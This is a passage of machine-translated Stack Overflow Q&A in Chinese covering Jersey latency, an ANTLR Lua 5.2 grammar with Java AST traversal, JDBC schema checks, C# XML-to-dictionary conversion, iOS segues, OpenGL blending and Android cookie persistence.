如果您决定采用这种方法，请注意，强烈建议您将 hibernate 内容与 Jersey 服务分开。您需要将您的 DAO 连接到您的服务层。看看@Rick Mangi 给我写了什么：[REST with Java (JAX-RS) using Jersey and hibernate](https://stackoverflow.com/questions/11190934/rest-with-java-jax-rs-using-jersey)

在您的 Android 应用程序中使用 HTTP 客户端也是一个好方法，因为它支持 @GET、@POST、@DELETE 和 @PUT 命令，并且您可以轻松地与您的数据库通信，如[HTTP GET 请求](https://stackoverflow.com/questions/11526437/android-illegalstateexception-in-httpget/11526693#11526693)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T16:00:51.323

也许，通过使用 MySQL Java 连接器，并使用 Java 的 JDBC 连接器作为导入到您的 Android 项目中的 Jar 库，通过端口 3306 直接连接到服务器，如图所示[，](http://www.coderanch.com/t/538757/Android/Mobile/Connect-MySql-Android)这也是很久以前的[博客](http://shariqmobin.wordpress.com/2010/03/06/hello-world/)

# java - 尝试在 Jersey 2.0 上测试延迟（异步与同步）

> ID：11955704
> 
> 赞同：0
> 
> 时间：2012-08-14T15:27:27.447
> 
> 标签：java, rest, testing, jersey, netty

尽管 stackoverflow 之前帮助过很多次，但这是我第一次提出问题。足够的吸吮，让我们继续讨论这个问题:)

我对 RESTful 服务非常陌生，对泽西岛更是陌生，在过去的 3/4 周里，我一直在搞砸一个项目，我有一些问题，我真的希望你能帮助我：

第一个是如果有人知道一种很好且简单的方法来测量一个或多个客户端的延迟和请求/秒，因为我经历过泽西岛有很高的延迟并且需要一些更具体的数据来帮助我确定它在多大程度上是一个对我来说不错的选择。

第二个问题更像是对第一个问题的跟进。知道 Jersey 异步调用资源，我相信这是导致高延迟的原因，所以我试图同步进行，但我无法真正理解 Jersey 所做的整个调用。是否有人对我正在尝试做的事情有解决方案，或者至少可以向我解释 Jersey 调用资源的过程？

我相信第二个问题是一个更复杂的问题（因为大多数人可能使用 1.12/13 直到 2.0 是最终版本）但是任何帮助将不胜感激，因为我是初学者，有些概念对我来说有点难以理解目前（尽管会继续努力学习；））

编辑： PS：我可能没有提到它，但我使用的是 netty4.0a2 容器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:57:02.523

你可以试试[jMeter 。](http://jmeter.apache.org/)它允许您轻松模拟并发请求和负载量的不同场景，并且还具有用于统计汇总和响应时间可视化分析的不错组件。

# java - 使用antlr解析特定函数中的lua IF语句

> ID：11955707
> 
> 赞同：2
> 
> 时间：2012-08-14T15:27:30.260
> 
> 标签：java, lua, antlr

我在java中使用带有antlr的Lua.g语法生成了一个Lua Parser。

我希望解析的 lua 代码基本上看起来像这样

```
function uniqueid_some_event (e) 
 if (e:HasString("string1")) then  
   -- do something
 end
 if (e:HasString("string2")) then  
  -- do something
 end
end 
```

对于特定的参与者绑定，我在不同的文件中有数百个这样的事件。

现在我想解析这些文件并收集每个检查的条件 - 在上述情况下 - 我想提取“string1”和“string2”作为事件触发器。（更准确地说，我想创建一个只显示每个文件的触发器的报告）

我收集我需要以某种方式修改 Lua.g 以在其中添加我自己的逻辑，但我迷路了，因为我没有找到任何关于此的文档 - 我查看了 LuaEclise，它基本上做了一些事情，但它也不适用于我。

那么 - 是否可以在生成的 LuaParser 中添加某种 w3c DOM 返回值？或者像 getFunctions() 这样返回所有找到的函数，在每个函数中 getHasStringStatements() 会返回条件？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-16T18:37:13.153

我不推荐使用[ANTLR wiki](http://www.antlr.org/grammar/1178608849736/Lua.g)中的 Lua 语法。AFAIK，它有很多问题（没有正确的长字符串和长注释、无效的数字/十六进制标记、全局回溯等等）。

这是 Lua 5.2 的（IMO）更好的语法：

```
/*
Copyright (c) 2011-2012 by Bart Kiers

Permission is hereby granted, free of charge, to any person
obtaining a copy of this software and associated documentation
files (the "Software"), to deal in the Software without
restriction, including without limitation the rights to use,
copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following
conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.
*/
grammar Lua52;

options {
 output=AST;
 ASTLabelType=CommonTree;
}

tokens {
  // literals
  And       = 'and';
  Break     = 'break';
  Do        = 'do';
  Else      = 'else';
  Elseif    = 'elseif';
  End       = 'end';
  False     = 'false';
  For       = 'for';
  Function  = 'function';
  Goto      = 'goto';
  If        = 'if';
  In        = 'in';
  Local     = 'local';
  Nil       = 'nil';
  Not       = 'not';
  Or        = 'or';
  Repeat    = 'repeat';
  Return    = 'return';
  Then      = 'then';
  True      = 'true';
  Until     = 'until';
  While     = 'while';
  Add       = '+';
  Minus     = '-';
  Mult      = '*';
  Div       = '/';
  Mod       = '%';
  Pow       = '^';
  Length    = '#';
  Eq        = '==';
  NEq       = '~=';
  LTEq      = '<=';
  GTEq      = '>=';
  LT        = '<';
  GT        = '>';
  Assign    = '=';
  OPar      = '(';
  CPar      = ')';
  OBrace    = '{';
  CBrace    = '}';
  OBrack    = '[';
  CBrack    = ']';
  ColCol    = '::';
  SCol      = ';';
  Col       = ':';
  Comma     = ',';
  DotDotDot = '...';
  DotDot    = '..';
  Dot       = '.';

  // imaginary tokens
  ASSIGNMENT;
  LOCAL_ASSIGNMENT;
  CONDITION;
  UNARY_MINUS;
  CALL;
  COL_CALL;
  INDEX;
  EXPR_LIST;
  VAR_LIST;
  CHUNK;
  NAME_LIST;
  LABEL;
  TABLE;
  FIELD_LIST;
  FIELD;
  FOR_IN;
  PARAM_LIST;
  FUNCTION;
  ASSIGNMENT_VAR;
  VAR;
}

@parser::header {
  package luja.parser;
}

@lexer::header {
  package luja.parser;
  import java.math.*;
}

@parser::members {

  private boolean addSelf = false;

  private CommonTree createPowAST(List tokens) {
    int n = tokens.size();

    CommonTree ast = new CommonTree(new CommonToken(Pow, "^"));
    ast.addChild((CommonTree)tokens.get(n - 2));
    ast.addChild((CommonTree)tokens.get(n - 1));

    for(int i = n - 3; i >= 0; i--) {
      CommonTree temp = new CommonTree(new CommonToken(Pow, "^"));
      temp.addChild((CommonTree)tokens.get(i));
      temp.addChild(ast);
      ast = temp;
    }

    return ast;
  }

  private CommonTree namesToVar(List<String> names, String name) {
    names.add(name);
    return namesToVar(names);
  }

  private CommonTree namesToVar(List<String> names) {

    if(names.size() == 1) {
      return new CommonTree(new CommonToken(Name, names.get(0)));
    }

    CommonTree ast = new CommonTree(new CommonToken(VAR, "VAR"));

    ast.addChild(new CommonTree(new CommonToken(Name, names.get(0))));

    for(int i = 1; i < names.size(); i++) {
      CommonTree indexNode = new CommonTree(new CommonToken(INDEX, "INDEX"));
      indexNode.addChild(new CommonTree(new CommonToken(Name, names.get(i))));
      ast.addChild(indexNode);
    }

    return ast;
  }

  @Override
  public void reportError(RecognitionException e) {
    throw new RuntimeException(e); 
  }
}

@lexer::members {

  private boolean ahead(CharSequence chars) {
    for(int i = 0; i < chars.length(); i++) {
      if(input.LA(i + 1) != chars.charAt(i)) {        
        return false;
      }
    }
    return true;
  }

  @Override
  public void reportError(RecognitionException e) {
    throw new RuntimeException(e); 
  }

  private String unescape(String text) {
    StringBuilder b = new StringBuilder();
    String regex = "\\\\([\\\\abfnrtv\"']|\r?\n|\r|\\d{1,3}|x[0-9a-fA-F]{2}|z\\s*)|(?s).";
    java.util.regex.Matcher m = java.util.regex.Pattern.compile(regex).matcher(text);
    while(m.find()) {
      if(m.group(1) != null) {
        // an escaped char
        String matched = m.group(1);
        if(matched.equals("\\")) b.append("\\");
        else if(matched.equals("a")) b.append("\u0007");
        else if(matched.equals("b")) b.append("\u0008");
        else if(matched.equals("f")) b.append("\u000C");
        else if(matched.equals("n")) b.append("\n");
        else if(matched.equals("r")) b.append("\r");
        else if(matched.equals("t")) b.append("\t");
        else if(matched.equals("v")) b.append("\u000B");
        else if(matched.equals("\"")) b.append("\"");
        else if(matched.equals("'")) b.append("'");
        else if(matched.matches("\r?\n|\r")) b.append(matched);
        else if(matched.matches("\\d{1,3}")) b.append((char)Integer.parseInt(matched));
        else if(matched.matches("x[0-9a-fA-F]{2}")) b.append((char)Integer.parseInt(matched.substring(1), 16));
        else if(matched.equals("z\\s*")) { /* do nothing, remove from string */ }
      }
      else {
        // a normal char, append "as is"
        b.append(m.group());
      }
    }
    return b.toString();
  }
}

//////////////////////////////// parser rules //////////////////////////////// 
parse
 : chunk EOF -> chunk
 ;

chunk
 : stat* ret_stat? -> ^(CHUNK stat* ret_stat?)
 ;

stat
 : (assignment)=> assignment
 | var[false]                         // must be a function call, not an index: check and throw exception
 | do_block 
 | while_stat
 | repeat_stat
 | local
 | goto_stat
 | if_stat
 | for_stat
 | function
 | label
 | Break
 | ';' -> /* remove from AST (empty rewrite rule) */
 ;

do_block
 : Do chunk End -> ^(Do chunk)
 ;

while_stat
 : While expr do_block -> ^(While expr do_block)
 ;

repeat_stat
 : Repeat chunk Until expr -> ^(Repeat chunk expr) 
 ;

assignment
 : var_list '=' expr_list // in every 'var' in 'var_list', the last must be an 'index', not a 'call'
   -> ^(ASSIGNMENT ^(VAR_LIST var_list) ^(EXPR_LIST expr_list))
 ;

local
 : Local ( name_list '=' expr_list -> ^(LOCAL_ASSIGNMENT ^(NAME_LIST name_list) ^(EXPR_LIST expr_list))
         | Function Name func_body -> ^(LOCAL_ASSIGNMENT ^(NAME_LIST Name) ^(EXPR_LIST func_body))
         )
 ;

goto_stat
 : Goto Name -> ^(Goto Name)
 ;

if_stat
 : If expr Then chunk elseif_stat* else_stat? End -> ^(If ^(CONDITION expr chunk) elseif_stat* else_stat?)
 ;

elseif_stat
 : Elseif expr Then chunk -> ^(CONDITION expr chunk)
 ;

else_stat
 : Else chunk -> ^(CONDITION True chunk)
 ;

for_stat
 : For ( Name '=' a=expr ',' b=expr (',' c=expr)? do_block -> ^(For Name $a $b $c? do_block)
       | name_list In expr_list do_block                   -> ^(FOR_IN ^(NAME_LIST name_list) ^(EXPR_LIST expr_list) do_block)
       )
 ;

function
 : Function names ( Col Name {addSelf=true;} func_body {addSelf=false;} 
                    -> ^(ASSIGNMENT ^(VAR_LIST {namesToVar($names.list, $Name.text)}) ^(EXPR_LIST func_body))
                  | func_body
                    -> ^(ASSIGNMENT ^(VAR_LIST {namesToVar($names.list)}) ^(EXPR_LIST func_body))
                  )
 ;

names returns [List<String> list]
@init{$list = new ArrayList<String>();}
 : a=Name {$list.add($a.text);} ('.' b=Name {$list.add($b.text);})*
 ;

function_literal
 : Function func_body -> func_body
 ;

func_body
 : '(' param_list ')' chunk End -> ^(FUNCTION param_list chunk)
 ;

param_list
 : name_list (',' DotDotDot)? -> ^(PARAM_LIST name_list DotDotDot?)
 | DotDotDot?                 -> ^(PARAM_LIST DotDotDot?)
 ;

ret_stat
 : Return expr_list? ';'? -> ^(Return expr_list?)
 ;

expr
 : or_expr
 ;

or_expr
 : and_expr (Or^ and_expr)*
 ;

and_expr
 : rel_expr (And^ rel_expr)*
 ;

rel_expr
 : concat_expr ((LT | GT | LTEq | GTEq | NEq | Eq)^ concat_expr)?
 ;

concat_expr
 : add_expr (DotDot^ add_expr)*
 ;

add_expr
 : mult_expr ((Add | Minus)^ mult_expr)*
 ;

mult_expr
 : unary_expr ((Mult | Div | Mod)^ unary_expr)*
 ;

unary_expr
 : Minus unary_expr -> ^(UNARY_MINUS unary_expr)
 | Length pow_expr  -> ^(Length pow_expr)
 | Not unary_expr   -> ^(Not unary_expr)
 | pow_expr
 ;

// right associative
pow_expr
// : (a=atom -> $a) ((Pow atom)+ -> ^(Pow atom+))?
 : (a+=atom -> $a) ((Pow a+=atom)+ -> {createPowAST($a)})?
 ;

atom
 : var[false]
 | function_literal
 | table_constructor
 | DotDotDot 
 | Number
 | String
 | Nil
 | True
 | False
 ;

var[boolean assign]
 : (callee[assign] -> callee) ( (tail)=> (((tail)=> t=tail)+ -> {assign}? ^(ASSIGNMENT_VAR callee tail+)
                                                             ->           ^(VAR callee tail+))
                              )?
 ;

callee[boolean assign]
 : '(' expr ')' -> expr
 | Name
 ;

tail
 : '.' Name                    -> ^(INDEX String[$Name.text])
 | '[' expr ']'                -> ^(INDEX expr)
 | ':' Name '(' expr_list? ')' -> ^(INDEX {new CommonTree(new CommonToken(String, $Name.text))}) ^(COL_CALL expr_list?)
 | ':' Name table_constructor  -> ^(INDEX {new CommonTree(new CommonToken(String, $Name.text))}) ^(COL_CALL table_constructor)
 | ':' Name String             -> ^(INDEX {new CommonTree(new CommonToken(String, $Name.text))}) ^(COL_CALL String)
 | '(' expr_list? ')'          -> ^(CALL expr_list?)
 | table_constructor           -> ^(CALL table_constructor)
 | String                      -> ^(CALL String)
 ;

table_constructor
 : '{' field_list? '}' -> ^(TABLE field_list?)
 ;

field_list
 : field (field_sep field)* field_sep? -> field+
 ;

field
 : '[' expr ']' '=' expr -> ^(FIELD expr expr)
 | Name '=' expr         -> ^(FIELD {new CommonTree(new CommonToken(String, $Name.text))} expr)
 | expr                  -> ^(FIELD expr)
 ;

field_sep
 : ',' 
 | ';'
 ;

label
 : '::' Name '::' -> ^(LABEL Name)
 ;

var_list
 : var[true] (',' var[true])* -> var+
 ;

expr_list
 : expr (',' expr)* -> expr+
 ;

name_list
 : Name (',' Name)* -> {addSelf}? {new CommonTree(new CommonToken(Name, "self"))} Name+
                    ->            Name+
 ;

//////////////////////////////// lexer rules //////////////////////////////// 
Name
 : (Letter | '_') (Letter | '_' | Digit)*
 ;

Number
 : (Digit+ ('.' Digit*)? Exponent? | '.' Digit+ Exponent?)    {setText(new java.math.BigDecimal($text).toPlainString().replaceAll("\\.0*$", ""));}
 | '0' ('x' | 'X') a=HexDigits ('.' b=HexDigits?)? c=BinaryExponent? 
   {
     double num = Long.parseLong($a.text, 16);

     if($b != null) {
       double fraction = Long.parseLong($b.text, 16) / Math.pow(16, $b.text.length());
       num += fraction;
     }

     if($c != null) {
       int binExp = Integer.valueOf($c.text.contains("+") ? $c.text.substring(2) : $c.text.substring(1));
       for(int i = 0; i < Math.abs(binExp); i++) {
         num = binExp < 0 ? num/2 : num*2;
       }
     }

     setText(new BigDecimal(Double.toString(num)).toPlainString().replaceAll("\\.0*$", ""));
   }
 ;

String
 : '"'  (EscapeSequence | ~('\\' | '"'  | '\r' | '\n'))* '"'  {setText(unescape($text.substring(1, $text.length()-1)));}
 | '\'' (EscapeSequence | ~('\\' | '\'' | '\r' | '\n'))* '\'' {setText(unescape($text.substring(1, $text.length()-1)));}
 | LongBracket                                                {setText($text.replaceAll("^\\[=*\\[|]=*]$", ""));}
 ;

//////////////////////////////// lexer rules to skip //////////////////////////////// 
Comment
 : '--' ( LongBracket
        | '[' '='* ~('=' | '[') ~('\r' | '\n')* // matches '--[=====...' as a single line comment
        | (~'[' ~('\r' | '\n')*)?
        )
        {skip();}
 ;

Space
 : (' ' | '\t' | '\r' | '\n' | '\u000C')+ {skip();}
 ;

//////////////////////////////// fragment lexer rules //////////////////////////////// 
fragment Letter
 : 'a'..'z' 
 | 'A'..'Z'
 ;

fragment Digit
 : '0'..'9'
 ;

fragment HexDigit
 : Digit
 | 'a'..'f'
 | 'A'..'F'
 ;

fragment HexDigits
 : HexDigit+
 ;

fragment Exponent
 : ('e' | 'E') ('-' | '+')? Digit+
 ;

fragment BinaryExponent
 : ('p' | 'P') ('-' | '+')? Digit+
 ;

fragment EscapeSequence
 : '\\' ( ('a' | 'b' | 'f' | 'n' | 'r' | 't' | 'v' | '\\' | '"' | '\'' | 'z' | LineBreak)
        | Digit (Digit Digit?)?
        | 'x' HexDigit HexDigit
        )
 ;

fragment LineBreak
 : '\r'? '\n'
 | '\r' 
 ;

fragment LongBracket
@init{StringBuilder b = new StringBuilder("]");}
 :
   // match opening bracket and build equal sized closing bracket
   '[' ('=' {b.append("=");})* '[' {b.append("]");}

   // keep matching chars until the closing bracket is ahead
   ({!ahead(b)}?=> (~'\\' | EscapeSequence) )*

   {
     if(input.LA(1) == EOF) {
       throw new RuntimeException("unfinished long comment or string near '<eof>'");
     }

     // let the lexer match the closing bracket
     match(b.toString());
   }

 ; 

//////////////////////////////// a fall through rule throwing an exception //////////////////////////////// 
Any
@after {throw new RuntimeException("unexpected symbol near: '" + $text + "'");}
 : .
 ; 
```

如果您现在解析以下输入：

```
--[===[
    function uniqueid_some_event (e)
     if (e:HasString("ignore string1")) then
       -- do something
     end
     if (e:HasString("ignore string2")) then
      -- do something
     end
    end
    some invalid closing comment tags: ]==] ]====]
]===]

function uniqueid_some_event (e)
 if (e:HasString("string1")) then
   -- do something
 end
 if (e:HasString("string2")) then
  -- do something
 end
end

if (e:HasString("outside function...")) then end 
```

您将从生成的解析器返回以下 AST：

![在此处输入图像描述](../Images/8dc9cbaa1c65503899345ce12d384f4f.png)

现在你需要做的就是遍历 AST，当你偶然发现一个`ASSIGNMENT`节点时，检查右子节点是否是一个包含 a 的表达式列表`FUNCTION`。如果发生这种情况，请遍历此节点以查找其中包含字符串表达式的 if 语句。

这是一个开始：

```
public class LUjATest {

    private static void findFunctions(CommonTree tree) {
        if (tree == null) return;

        if(tree.getType() == Lua52Parser.ASSIGNMENT) {

            String name = tree.getChild(0).getChild(0).getText();
            CommonTree expressions = (CommonTree) tree.getChild(1);

            if(expressions.getChildCount() > 0 &&
                    expressions.getChild(0).getType() == Lua52Parser.FUNCTION) {

                System.out.println("walk the tree:\n  " + expressions.toStringTree() +
                        "\nto find all strings for event: '" + name + "'");
            }
        }
        else {
            for (int i = 0; i < tree.getChildCount(); i++) {
                findFunctions((CommonTree) tree.getChild(i));
            }
        }
    }

    public static void main(String[] args) throws Exception {
        Lua52Lexer lexer = new Lua52Lexer(new ANTLRFileStream("src/lua/test.lua"));
        Lua52Parser parser = new Lua52Parser(new CommonTokenStream(lexer));
        CommonTree tree = (CommonTree) parser.parse().getTree();
        findFunctions(tree);
    }
} 
```

运行上面的类时，您将看到以下输出：

```
走树：
  (EXPR_LIST (FUNCTION (PARAM_LIST e) (CHUNK (if (CONDITION (VAR e (INDEX HasString) (COL_CALL string1)) CHUNK))) (if (CONDITION (VAR e (INDEX HasString) (COL_CALL string2)) CHUNK)))) )
查找事件的所有字符串：'uniqueid_some_event'
```

# java - 用于检查给定用户、模式、表是否存在的 Java 代码？

> ID：11955709
> 
> 赞同：3
> 
> 时间：2012-08-14T15:27:34.257
> 
> 标签：java, jdbc, oracle11g

我想制作 Java 代码（也使用 Oracle 11g 和 JDBC）来检查特定用户或模式是否存在。如何通过仅使用 Java 代码而不是通过执行 SQL 查询（在我的 Java 代码中）来进行检查来做到这一点？

谢谢。

编辑 -

方法一：

在 MySQL 中，我们可以使用这样的东西 -

```
Connection conn = DriverManager.getConnection(url,username,password);
DatabaseMetaData DMD = conn.getMetaData();
ResultSet res = DMD.getCatalogs();
 while (res.next()) {
      String database = res.getString("TABLE_CAT");
} 
```

现在在 while 中放置一个 if 来检查它是否存在 DB。

方法二：

或者，您可以执行本文中提到的一些查询。 [使用 SQL 查询判断表是否存在](https://stackoverflow.com/questions/4385346/using-sql-query-to-determine-if-a-table-exists)

我想使用类似方法 1 的方法来完成这项工作，而不是方法 2 - 这就是我的意思。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:41:12.147

就这类事情询问数据库的纯 JDBC 方法是在 Java 应用程序中 使用[DatabaseMetaData 类。](http://docs.oracle.com/javase/6/docs/api/java/sql/DatabaseMetaData.html)[DatabaseMetaData.getSchemas](http://docs.oracle.com/javase/6/docs/api/java/sql/DatabaseMetaData.html#getSchemas%28%29)将为您提供数据库中的模式集。 [DatabaseMetaData.getTables](http://docs.oracle.com/javase/6/docs/api/java/sql/DatabaseMetaData.html#getTables%28java.lang.String,%20java.lang.String,%20java.lang.String,%20java.lang.String%5B%5D%29)将为您提供表的列表。您可以编写遍历这些`ResultSet`对象的代码，以查看是否存在特定的表或模式。

当然，在幕后，JDBC 驱动程序只是对 Oracle 数据字典执行 SQL 查询以获取此信息。

# c# - C# 从 XML 加载字典

> ID：11955710
> 
> 赞同：6
> 
> 时间：2012-08-14T15:27:40.040
> 
> 标签：c#, xml, linq-to-xml

我有一个如下所示的 XML 文件：

```
<Cities>
    <Name>Seattle</Name>
    <State>WA</State>
    <Population>552105</Population>
</Cities> 
```

我想将城市信息加载到字典中，以便我的字典看起来像：

```
cityDictionary("Name") = "Seattle"
cityDictionary("State") = "WA"
cityDictionary("Population") = "552105" 
```

以下代码确实有效：

```
var doc = XDocument.Load(@"..\..\Cities.xml");
var rootNodes = doc.Root.DescendantNodes().OfType<XElement>();
var keyValuePairs = from n in rootNodes
                    select new
                    {
                        TagName = n.Name,
                        TagValue = n.Value
                    };

Dicitionary<string, string> allItems = new Dictionary<string, string>();
foreach (var token in keyValuePairs) {
    allItems.Add(token.TagName.ToString(), token.TagValue.ToString());
} 
```

但我想做这一步。

有什么建议么？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-14T15:36:20.133

为什么这么复杂？以下是您可以在方法链语法中执行此操作的方法：

```
var allItems = rootNodes.ToDictionary(n => n.Name.ToString(), n => n.Value); 
```

或者只是作为一个普通的旧循环，如果您需要使用旧版本的 C# 或者想要保持老式的东西：

```
var allItems = new Dictionary<string, string>();
foreach (var node in rootNodes)
{
    allItems.Add(node.Name.ToString(), node.Value);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-14T15:31:56.763

试试这个[`ToDictionary.`](http://msdn.microsoft.com/en-us/library/bb548657.aspx)

```
 Dictionary<string, string> allItems = rootNodes.ToDictionary(v => v.Name, v => v.Value); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-14T15:38:58.463

在此示例中，您必须确保将 TagName 转换为字符串

```
Dictionary<string, string> allItems = (from n in rootNodes
select new
            {
                TagName = n.Name,
                TagValue = n.Value
            }).ToDictionary(v => v.TagName.ToString(), v => v.TagValue); 
```

或将 XName 存储为密钥

```
Dictionary<XName, string> allItems = (from n in rootNodes
select new
            {
                TagName = n.Name,
                TagValue = n.Value
            }).ToDictionary(v => v.TagName, v => v.TagValue); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-06-08T05:43:12.440

```
var element = xmlDoc.Root.Element("Cities");
            if (element != null)
            {
                var idList = element.Descendants().Where(p_ => p_.Name == "Name").Select(v_ => v_.Value).ToArray();
                var valList = element.Descendants().Where(p_ => p_.Name == "Population").Select(v_ => v_.Value).ToArray();

                var citiesDictionary = idList.Zip(valList, (key_, value_) => new { k = key_, v = value_ }).ToDictionary(x_ => x_.k, x_ => x_.v); 
```

# objective-c - 使用自定义 segue 关闭模态视图控制器

> ID：11955712
> 
> 赞同：0
> 
> 时间：2012-08-14T15:27:42.540
> 
> 标签：objective-c, uistoryboardsegue

我创建了两个自定义 segue 文件，并且在这两个文件中，我都覆盖了该`perform`方法。但是，似乎自定义 segue 仅在呈现 new 时才有效`UIViewController`，而相反的 segue 不设置动画，只是忽略了 source `UIViewController`。

反向自定义segue：

```
- (void)perform {
UIViewController *sourceViewController = self.sourceViewController;
    UIViewController *sourceTabBarController = sourceViewController.parentViewController.parentViewController;
    UIViewController *destinationViewController = self.destinationViewController;
    UIGraphicsBeginImageContext(destinationViewController.view.bounds.size);
        [destinationViewController.view.layer renderInContext:UIGraphicsGetCurrentContext()];
        UIImage *destinationViewControllerImage = UIGraphicsGetImageFromCurrentImageContext();
        UIGraphicsEndImageContext();

    UIImageView *destinationViewControllerImageView = [[UIImageView alloc] initWithImage:destinationViewControllerImage];
    destinationViewControllerImageView.userInteractionEnabled = YES;
    destinationViewControllerImageView.frame = CGRectMake(0.0f, 0.0f, CGRectGetWidth(destinationViewController.view.frame), CGRectGetHeight(destinationViewController.view.frame));

[destinationViewController.view insertSubview:destinationViewControllerImageView atIndex:1];

// Add animations
    [UIView animateWithDuration:0.4f
                          delay:0.0f
                        options:UIViewAnimationOptionCurveEaseIn
                     animations:^{
                         destinationViewControllerImageView.center = CGPointMake(-CGRectGetWidth(destinationViewControllerImageView.frame) / 2, -(CGRectGetHeight(destinationViewControllerImageView.frame) / 2));
                     }
                     completion:nil];

    [sourceViewController dismissViewControllerAnimated:NO completion:nil];
} 
```

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T15:32:03.240

Segues 添加了一个新版本的视图控制器。刚开始时，我遇到了一些*有趣*的问题，即使用 segues 来关闭视图控制器。

而不是编写自定义 segue，您应该在“关闭”的视图控制器中使用自定义动画块。

# opengl - openGL：顺序无关的最大混合

> ID：11955718
> 
> 赞同：3
> 
> 时间：2012-08-14T15:28:01.857
> 
> 标签：opengl

我正在尝试实现某种混合效果，但未能做到恰到好处：

![在此处输入图像描述](../Images/578dabf7756cbf1d6beffc84e29e64d6.png)

在这张图片上，您可以在黑色背景上看到 3 条“发光线”。

`glBlendFunc(GL_SRC_ALPHA, GL_DST_ALPHA)`用于混合。

然而，这有一个我想摆脱的工件，顺序很明显并且有效果。

如果您仔细观察，您会发现首先渲染了垂直线，因为它被其他人遮挡了，然后渲染了红色。最后你有相当覆盖最后一行，特别是它相当不透明的中心会覆盖所有内容。

目标是有效地获得亮度总和，最亮的部分优先，而不管渲染顺序如何。有没有办法做到这一点？

此外，这是创建一个对象的一部分，然后将其作为一个整体进行渲染，因此可以将所有线条渲染到 FBO，执行魔术（着色器？），然后将 FBO 渲染到场景中。

编辑：用于个人测试；python+pyglet的源代码和发光线纹理：

[https://dl.dropbox.com/u/44766482/blendtest.zip](https://dl.dropbox.com/u/44766482/blendtest.zip)

A/D 键循环切换目标模式，W/S 键循环切换源模式。第一行您可以更改图像路径，以在纹理中的透明度和黑色之间进行更改 - 但生成的图像需要实际的透明度而不是黑色。

# android - 使用 httpPost 和 httpclient 持久化 cookie

> ID：11955722
> 
> 赞同：1
> 
> 时间：2012-08-14T15:28:14.973
> 
> 标签：android, cookies, http-post, httpclient, cookiestore

我有向网络服务发送请求的类

```
public class JSONParser {
CookieStore store = new BasicCookieStore();
   static InputStream is = null;
    static JSONObject jObj = null;
    static String json = "";
    private static final DefaultHttpClient httpClient = new DefaultHttpClient() ;
 public static DefaultHttpClient getInstance() { return httpClient; }

public JSONObject getJSONFromUrl(String url, List<NameValuePair> params) {

    // Making HTTP request
    try {
        CookieStore cookieStore = new BasicCookieStore();

        // Create local HTTP context
        HttpContext localContext = new BasicHttpContext();

        // Bind custom cookie store to the local context
        localContext.setAttribute(ClientContext.COOKIE_STORE, cookieStore);

        DefaultHttpClient httpClient = JSONParser.getInstance();
        List<Cookie> cookies = httpClient.getCookieStore().getCookies();
        httpClient.getParams().setParameter(CoreProtocolPNames.USER_AGENT, "Android-AEApp,ID=2435743");
        httpClient.getParams().setParameter(ClientPNames.COOKIE_POLICY, CookiePolicy.RFC_2109);
        HttpPost httpPost = new HttpPost(url);
        httpPost.setEntity(new UrlEncodedFormEntity(params));
        httpPost.setHeader("User-Agent","Android-AEApp,ID=2435743");

        cookies = httpClient.getCookieStore().getCookies();
        httpPost.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        httpPost.setHeader("Cookie", "PHPSESSID=lc89a2uu0rj6t2p219gc2cq4i2; path=/");
        HttpResponse httpResponse = httpClient.execute(httpPost);
        HttpEntity httpEntity = httpResponse.getEntity();
        cookies = httpClient.getCookieStore().getCookies();

        if (cookies.isEmpty()) {
            for (Cookie a : cookies)
            cookieStore.addCookie(a);
        } else {
            for (Cookie a : cookies) {
                cookieStore.addCookie(a);
                System.out.println("- " + a.getValue().toString());
            }
        }

        is = httpEntity.getContent();

    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    } catch (ClientProtocolException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
   } 
```

我第一次通过

```
httpPost.setHeader("Cookie", "PHPSESSID=lc89a2uu0rj6t2p219gc2cq4i2; path=/"); 
```

然后我得到新请求的 cookie。当我尝试更新它们时，它会使用旧的。如果服务器更改了我的 cookie，我该如何更新它们？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-15T11:16:40.330

问题解决了。我将 Singletone 用于我的 Cookie 的 ArrayList。它看起来像这样：

```
public class CookieStorage {

    private ArrayList<Object> arrayList;

    private static CookieStorage instance;

    private CookieStorage(){
        arrayList = new ArrayList<Object>();
    }

    public static CookieStorage getInstance(){
        if (instance == null){
            instance = new CookieStorage();
        }
        return instance;
    }

    public ArrayList<Object> getArrayList() {
        return arrayList;
    }

    @Override
    public String toString()
    {       
    return getArrayList().toString();   
    }
} 
```

这就是我在 RestClient 类中使用它的方式：

```
if (CookieStorage.getInstance().getArrayList().isEmpty())
        CookieStorage.getInstance().getArrayList().add("PHPSESSID=lc89a2uu0rj6t2p219gc2cq4i2");
    RestClient.this.AddHeader("Cookie",  CookieStorage.getInstance().getArrayList().get(0).toString()); 
```

并在请求执行后：

```
 httpResponse = client.execute(request);
            if (httpResponse.getLastHeader("Set-Cookie")!=null)
            {
                CookieStorage.getInstance().getArrayList().remove(0);
                CookieStorage.getInstance().getArrayList().add(httpResponse.getLastHeader("Set-Cookie").getValue());
            } 
```

